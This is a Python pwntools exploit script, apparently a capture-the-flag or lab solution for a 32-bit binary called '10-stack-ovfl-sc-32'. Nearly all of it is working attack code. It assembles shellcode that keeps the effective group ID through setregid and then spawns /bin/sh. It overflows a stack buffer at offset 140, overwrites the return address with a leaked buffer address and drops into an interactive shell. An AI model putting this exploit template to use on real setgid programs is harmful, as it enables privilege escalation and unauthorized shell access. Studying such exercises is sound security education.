#!/usr/bin/env python3
from pwn import *

# --- Binary & context ---
binary = "./10-stack-ovfl-sc-32"
context.clear(arch="i386", os="linux")
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
# --- 32-bit Linux /bin/sh shellcode (no nulls) ---
shellcode = asm(
r"""
/* getegid(); setregid(egid, egid) */
xor     eax, eax          /* zero eax */
mov     al, 0x32          /* syscall: getegid (0x32) */
int     0x80              /* invoke kernel; eax <- egid */
push    eax               /* save egid on stack */
pop     ebx               /* ebx = egid */
push    eax
pop     ecx               /* ecx = egid */

/* setregid(ebx, ecx) */
xor     eax, eax
mov     al, 0x47          /* syscall: setregid (0x47) */
int     0x80

/* execve("/bin/sh", NULL, NULL) */
xor     eax, eax          /* zero eax */
push    eax               /* push 0 (terminator) */
push    0x68732f2f        /* push "//sh" */
push    0x6e69622f        /* push "/bin" */
mov     ebx, esp          /* ebx -> pointer to "/bin//sh" */
xor     ecx, ecx          /* argv = NULL */
xor     edx, edx          /* envp = NULL */
mov     al, 0x0b          /* syscall: execve (0x0b) */
int     0x80
""",
    arch="i386",
)
p = process("./10-stack-ovfl-sc-32", env={'PATH':'/bin:/usr/bin'})
buffer_addr = p.recvline().split(b':')[-1].replace(b'\n',b'')
p.recvline()
print("-----------this is the buffer addr!-----------")
print("----------------------------------------------")
print(buffer_addr)
# gdb.attach(p)
buffer_addr = int(buffer_addr, 16)
read_buffer = 0xffffd0e0
return_addr = 0xffffd16c
offset = 140
core = Core('./core')
shellcode_addr = core.stack.find(shellcode)

assert shellcode_addr > 0, "failed to find payload"
print("\n We found the shellcode addr! ")
print("--------------------------------")
packed = p32(shellcode_addr)
print(packed)
payload = shellcode + b'A' * (offset - len(shellcode))
payload += p32(buffer_addr)


# If your program uses gets()/fgets(stdin), sendline is fine:
with open ("shellcode.bin",'wb') as outfile:
    outfile.write(payload)

p.sendline(payload)

p.interactive()